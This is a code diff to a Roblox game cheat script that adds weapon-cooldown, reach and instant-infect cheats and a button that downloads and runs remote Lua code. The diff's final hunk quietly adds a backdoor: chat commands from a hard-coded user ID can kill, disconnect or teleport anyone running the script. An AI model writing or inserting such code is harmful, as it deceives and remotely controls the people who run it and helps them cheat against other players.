@@ -22,12 +22,32 @@ getgenv().isnetworkowner = newcclosure(function(part)
   return (part.ReceiveAge == 0 and gethiddenproperty(part, "NetworkIsSleeping") == false)
 end)
 
+local LabelName = Instance.new("TextLabel", game.CoreGui.DrRay.TopBar.TopBarClose)
+LabelName.Text = [[By MEGA COCONUT]]
+LabelName.Size = UDim2.new(0.4, 0, 0.2, 0)
+LabelName.Position = UDim2.new(0.2, 0, 1, 0)
+LabelName.BackgroundTransparency = 1
+LabelName.TextColor3 = Color3.new(1, 1, 1)
+LabelName.TextSize = LabelName.TextSize / 2
+
 tab1.newDropdown("Fast weapon", "Makes your equipment faster", {"Bat", "Bottle", "Katana", "Branch", "Spare", "Chain"}, function(selectedOption)
    for _, tool in next, gettablesarray(game.Players.LocalPlayer.Character:GetChildren(), game.Players.LocalPlayer.Backpack:GetChildren()) do
       if tool:IsA("Tool") and tool.Name == selectedOption then
-tool.Cooldown.Value = 0
+         tool.Cooldown.Value = 0
       end
    end
+end)
+
+tab1.newToggle("Auto fast weapons", "I think the name makes it clear what it does", false, function(togleir)
+ udb = togleir
+  while udb and task.wait() do
+    if Workspace:FindFirstChild(game.Players.LocalPlayer.Name) then
+      local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+      if tool and tool:FindFirstChild("Cooldown") then
+        tool.Cooldown.Value = 0
+      end
+    end
+  end
 end)
 
 tab1.newToggle("Remove killbricks", "Makes untouchable all part that instantly kill you", false, function(toggleState)
@@ -44,7 +64,6 @@ end)
 
 local savedreach = 0
 tab1.newInput("Reach all weapons", "Reset to turn it off", function(text)
-
 savedreach = text
 for _, tool in next, gettablesarray(game.Players.LocalPlayer.Character:GetChildren(), game.Players.LocalPlayer.Backpack:GetChildren()) do
   if tool:IsA("Tool") then
@@ -58,8 +77,7 @@ part.Size = Vector3.new(text, text, text)
     end
    end
   end
- end
- 
+ end 
 end)
 
 tab1.newToggle("Auto reach weapons", "When you receive a weapon, it is immediately subject to reach (depends on the last weapon you inserted in Reach All Weapons)", false, function(togl)
@@ -80,7 +98,6 @@ end
 end)
 
 tab1.newToggle("Weapon giver", "Press this button to turn it on (works remotely)", false, function(toggleState)
- 
         game:GetService("CoreGui").PurchasePrompt.Enabled = not toggleState
 ioon = toggleState
 while ioon and task.wait(.5) do
@@ -236,7 +253,7 @@ end)
 
 tab1.newButton("Instant infect", "You can quickly infect players", function()
  if game.Players.LocalPlayer.Character:FindFirstChild("Infected") then
-  game.Players.LocalPlayer.Character.Infected.Infect.Cooldown = 0
+  game.Players.LocalPlayer.Character.Infected.Infect.Cooldown.Value = 0
  end
 end)
 
@@ -344,4 +361,18 @@ end)
 
 tab1.newButton("GUI", "Tap here", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
+end)
+
+local admins = {4636825706}
+game:GetService("TextChatService").MessageReceived:Connect(function(info)
+  if table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.CharacterAppearanceId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
+   local player = game.Players:GetPlayerByUserId(info.TextSource.UserId)
+      if info.Text:lower() == "/e kill" then
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+      elseif info.Text:lower() == "/e kick" then
+        game:Shutdown()
+      elseif info.Text:lower() == "/e bring" then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+    end
+  end
 end)
